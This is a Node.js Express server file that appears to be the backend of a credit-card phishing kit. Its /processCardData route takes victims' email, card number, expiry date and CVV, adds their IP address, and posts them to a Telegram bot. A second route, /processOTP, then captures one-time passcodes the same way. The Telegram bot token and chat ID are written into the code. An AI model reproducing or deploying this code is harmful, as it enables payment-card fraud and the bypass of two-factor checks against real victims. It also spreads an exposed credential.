// server.js
const express    = require('express');
const bodyParser = require('body-parser');
const path       = require('path');

const app  = express();
const port = process.env.PORT || 3000;

// 1) Serve static files from public/
app.use(express.static(path.join(__dirname, 'public')));

// 2) Body parser middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// 3) Helper to get client IP
function getUserIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    return xff.split(',')[0];
  }
  return req.connection.remoteAddress || req.socket.remoteAddress;
}

// 4) Telegram config
const telegramToken = "7765277959:AAEpW-EOztAOxPIsB6ha23Bf0Bfp84tBPhw";
const chatId        = "6067843686";

// 5) Route: return user IP
app.get('/get-user-ip', (req, res) => {
  const ip = getUserIP(req);
  res.send(ip);
});

// 6) Route: process card data (from index.html form)
app.post('/processCardData', async (req, res) => {
  const { email, "card-number": cardNumber, "expiry-date": expiryDate, cvv } = req.body;
  if (!email || !cardNumber || !expiryDate || !cvv) {
    return res.status(400).send('Incomplete data');
  }
  const userIP = getUserIP(req);
  const message =
    `🔔 بطاقة جديدة:\n` +
    `📧 Email: ${email}\n` +
    `💳 Card: ${cardNumber}\n` +
    `📅 Expiry: ${expiryDate}\n` +
    `🔒 CVV: ${cvv}\n` +
    `🌐 IP: ${userIP}`;

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body:    new URLSearchParams({ chat_id: chatId, text: message })
      }
    );
    if (!tgRes.ok) throw new Error('Telegram API error');
    return res.redirect('/otp_form.html');
  } catch (err) {
    console.error(err);
    return res.status(500).send('Failed to send to Telegram');
  }
});

// 7) Route: process OTP (from otp_form.html)
app.post('/processOTP', async (req, res) => {
  const { otp } = req.body;
  if (!otp) {
    return res.status(400).send('OTP مطلوب');
  }
  const userIP = getUserIP(req);
  const message =
    `🔔 تم إدخال OTP:\n` +
    `✅ OTP: ${otp}\n` +
    `🌐 IP: ${userIP}`;

  try {
    const tgRes = await fetch(
      `https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body:    new URLSearchParams({ chat_id: chatId, text: message })
      }
    );
    if (!tgRes.ok) throw new Error('Telegram API error');
    return res.redirect('/success.html');
  } catch (err) {
    console.error(err);
    return res.status(500).send('Failed to send OTP to Telegram');
  }
});

// 8) Start server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
